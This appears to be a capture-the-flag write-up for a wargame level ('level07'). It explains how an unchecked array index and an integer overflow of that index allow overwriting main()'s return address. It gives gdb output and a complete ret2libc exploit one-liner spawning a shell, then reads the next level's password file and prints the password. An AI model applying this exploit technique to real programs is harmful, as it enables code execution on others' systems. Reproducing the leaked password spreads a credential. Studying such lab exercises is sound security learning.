@@ -1,0 +1,83 @@
+At a first glance, we do not notice any memory corruption possibility in this program.
+
+This program is a system to store unsigned ints in a dedicated data char array of size 400 (100 bytes * sizeof(int))
+
+
+There is however a critical flaw :
+No check is performed during number storage ((uint32_t *)data[index * sizeof(int)] = number;) to verify that the index is still in the data array bounds.
+The max index is data[100 * 4]. But nothing prevents us to write to data[500 * 4] as index is an user input.
+
+This means we are able to write arbitrary values in the stack, from @esp+0x24 (thanks to this flawed storing system).
+
+Therefore, the return address of main() on the stack is part of the memory space we can write over !
+
+Let's start by determining at which offset of data[] we need to write to reach main() return address.
+
+We first get the stackframe size of main :
+(gdb) p/d $ebp-$esp
+$1 = 488
+(gdb) p/x $ebp-$esp
+$2 = 0x1e8
+
+return address is at EBP+0x4
+(gdb) x/xw $ebp+0x4
+0xffffd23c:     0xf7dd6b41
+(gdb) x/xw 0xf7dd6b41
+0xf7dd6b41 <__libc_start_main+241>
+
+So, to reach the return address from data[], we need the index to be [(0x1e8-0x24) + 0x4] == 456
+
+As data[] is handled as an int buffer, we need to divide our index by the size of an int == 4. 456/4 == 114.
+
+(unsigned int)data[114] will therefore be main() return address.
+
+Now, there's a problem --> the program doesn't accept indexes that are multiples of 3, and sadly, 114%3 == 0...
+
+We first thought of writing to this memory space through two different writes (4 bytes before, with 2 bytes overflowing, and same after). But this cannot work, as the tab is handled as an int tab, and therefore entries can't "overflow" each other.
+
+However, like in rainfall, there's another trick we can use.
+The check of (index % 3 == 0) happens before index gets multiplied by sizeof(int).
+
+This means we can overflow the index variable, so as to bypass the %3 check, and still get the right index ! (456)
+
+We need a number that is not 114, but gives 456 multiplied by 4. (Yeah, computer science is weird) 
+
+456 in binary is 111001000
+
+multiplying by 4 ends up being the same as a 2 left bitshift (<<2)
+
+So we find a value where a carry bit dissapears to the left thanks to the overflow, is not a multiple of 3, and gives 111001000 after <<2 :
+
+0100 0000  0000 0000  0000 0000  0111 0010 (1073741938)
+ ^
+ |
+This bit will disappear after <<2
+
+Input command: store
+ Number: 3735928559
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+Segmentation fault
+
+So now we can overwrite the return address of main() to any address.
+We cannot put a shellcode in an environment var, or in argv, as they are nulled during program execution.
+
+However, we can use the ret2libc technique through the arbitrary memory writes. (there will be less bytes to write than by writing a shellcode on the stack ;D)
+
+For this, we will write :
+[address of system() @index 456] + [random address @index 460] + [address of "/bin/sh" string @index 464]
+| go to system instead of      |   | return address for      |   | first and only parameter to system() |
+| normal return address        |   | system(), unnecessary   |
+
+address of system :
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system> (4159090384)
+
+address of "/bin/sh" :
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec (4160264172)
+
+(python -c 'print "store\n4159090384\n1073741938\nstore\n4160264172\n116\nquit"'; cat) | ./level07 
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
